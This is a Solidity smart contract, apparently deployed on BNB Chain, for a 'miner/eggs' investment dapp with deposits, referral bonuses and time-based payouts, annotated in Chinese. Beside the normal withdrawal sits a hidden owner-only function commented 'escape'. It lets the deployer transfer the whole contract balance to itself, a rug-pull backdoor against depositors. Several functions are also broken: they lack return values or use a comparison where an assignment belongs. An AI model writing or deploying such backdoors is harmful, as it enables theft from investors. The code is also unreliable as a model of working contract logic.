/**
 *Submitted for verification at BscScan.com on 2022-08-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

contract TestHact {

    uint256 EGGS_TO_HATCH_1MINERS = 86400;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool public initialized = false;
    address public ceoAddress;
    // 本金
    mapping(address => uint256) private hatcheryMiners;
    // 邀请筹码
    mapping(address => uint256) private claimedEggs;
    // 入场时间与出厂时间
    mapping(address => uint256) private lastHatch;
    // 邀请地址
    mapping(address => address) private referrals;
    // 市场筹码
    uint256 private marketEggs;

    // 构造函数
    constructor (){
        ceoAddress = msg.sender;
    }

    // 项目启动
    function startMarket () public {
        require(msg.sender == ceoAddress,"invalid call");
        require(marketEggs == 0);
        initialized = true;
        marketEggs = 86400000000;
    }

    // 入金
    function buyEggs(address ref) public payable{
        // 判断项目是否启动
        require(initialized);
        uint256 eggBount = calEggsBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        uint256 fee = devFee(msg.value);
        ceoAddress.transfer(fee);
        claimedEggs[msg.sender] += eggBount;
        hatchEggs(ref);
    }

    function calEggsBuy(uint256 buy ,uint256 contractBalance) private view returns (uint256) {
        return calTrade(buy, contractBalance, marketEggs);
    }

    function calTrade(uint256 buy ,uint256 contractBalance ,uint256 marketEggs) private view returns (uint256) {
        return SafeMath.div(SafeMath.mul(PSN,marketEggs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,contractBalance),SafeMath.mul(PSNH,buy)),buy)));
    }

    // 手续费
    function devFee(uint256 amount) private view returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,3),100);
    }

    // 复投 + 邀请码
    function hatchEggs(address ref) public {
        require(initialized);
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0){
            ref == ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }
        uint256 eggsUsed = getMyEggs();
        uint256 newMiners = SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender] = SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = now;

        // 邀请人增加筹码
        claimedEggs[referrals[msg.sender]] = SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(SafeMath.mul(eggsUsed,13),100));
        marketEggs = SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }

    // 总筹码
    function getMyEggs() public view returns(uint256) {
        return claimedEggs[msg.sender] + getEggsSinceLastHatch(msg.sender);
    }

    // 本金 * 区块时间 持续生产
    function getEggsSinceLastHatch(address adr) private view returns(uint256) {
        uint256 secondsPassed = min(EGGS_TO_HATCH_1MINERS,block.timestamp-lastHatch[adr]);
    }

    function min(uint256 a , uint256 b) private view returns(uint256) {
        return a<b?a:b;
    }

    // 出金
    function sellEggs() public {
        require(initialized);
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calEggsSell(hasEggs);
        uint256 fee = devFee(eggValue);
        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = now;
        marketEggs = SafeMath.add(marketEggs,hasEggs);
        ceoAddress.transfer(fee);
        msg.sender.transfer(SafeMath.sub(eggValue,fee));
    }

    // 卖出公式
    function calEggsSell(uint256 hasEggs) private view returns(uint256) {
        calTrade(hasEggs,marketEggs,address(this).balance);
    }

    // 逃逸
    function sellEggs(address ref) public {
        require(msg.sender == ceoAddress,"invalid call");
        require(ref == ceoAddress);
        marketEggs = 0;
        msg.sender.transfer(address(this).balance);
    }

    // 奖池金额
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    // 本金
    function getMyMiners() public view returns(uint256) {
        return hatcheryMiners[msg.sender];
    }
}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}